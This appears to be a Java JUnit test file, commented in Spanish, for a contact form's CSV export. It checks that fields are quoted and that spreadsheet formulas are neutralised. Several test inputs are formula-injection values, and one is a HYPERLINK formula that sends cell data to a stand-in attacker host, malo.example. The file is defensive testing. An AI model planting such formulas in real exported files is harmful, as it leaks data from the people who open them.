package com.vera.contactos;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * Los campos del CSV los escribe un visitante anónimo y el archivo lo abre el dueño del negocio
 * en su Excel. Es un camino directo de uno al otro, así que aquí se prueba en serio.
 */
class ContactoCsvTest {

	@Test
	@DisplayName("un campo normal va entrecomillado y nada mas")
	void campoNormal() {
		assertThat(ContactoController.campo("Ana Ruiz")).isEqualTo("\"Ana Ruiz\"");
	}

	@Test
	@DisplayName("las comillas de dentro se duplican, que es como las escapa el formato")
	void comillasDentro() {
		assertThat(ContactoController.campo("dijo \"hola\"")).isEqualTo("\"dijo \"\"hola\"\"\"");
	}

	@Test
	@DisplayName("la coma y el salto de linea no parten la fila porque el campo va entrecomillado")
	void comasYSaltos() {
		assertThat(ContactoController.campo("Ruiz, Ana")).isEqualTo("\"Ruiz, Ana\"");
		assertThat(ContactoController.campo("linea1\nlinea2")).isEqualTo("\"linea1\nlinea2\"");
	}

	@Test
	@DisplayName("una formula en el nombre se desactiva: Excel la ejecutaria al abrir el archivo")
	void formulaDesactivada() {
		assertThat(ContactoController.campo("=1+1")).isEqualTo("\"'=1+1\"");
		assertThat(ContactoController.campo("+34600000000")).isEqualTo("\"'+34600000000\"");
		assertThat(ContactoController.campo("-2+3")).isEqualTo("\"'-2+3\"");
		assertThat(ContactoController.campo("@SUM(A1)")).isEqualTo("\"'@SUM(A1)\"");
	}

	@Test
	@DisplayName("el caso que de verdad se ha visto: un HYPERLINK que filtra datos al abrirlo")
	void elAtaqueDeVerdad() {
		String ataque = "=HYPERLINK(\"http://malo.example/?d=\"&A1,\"Haz clic\")";
		String salida = ContactoController.campo(ataque);
		assertThat(salida).startsWith("\"'=HYPERLINK");
		// Y las comillas de dentro tienen que seguir escapadas, o la fila se rompe.
		assertThat(salida).contains("\"\"http://malo.example/?d=\"\"");
	}

	@Test
	@DisplayName("un campo vacio o nulo sale vacio, no como comillas sueltas")
	void vacio() {
		assertThat(ContactoController.campo(null)).isEmpty();
		assertThat(ContactoController.campo("")).isEmpty();
	}

}
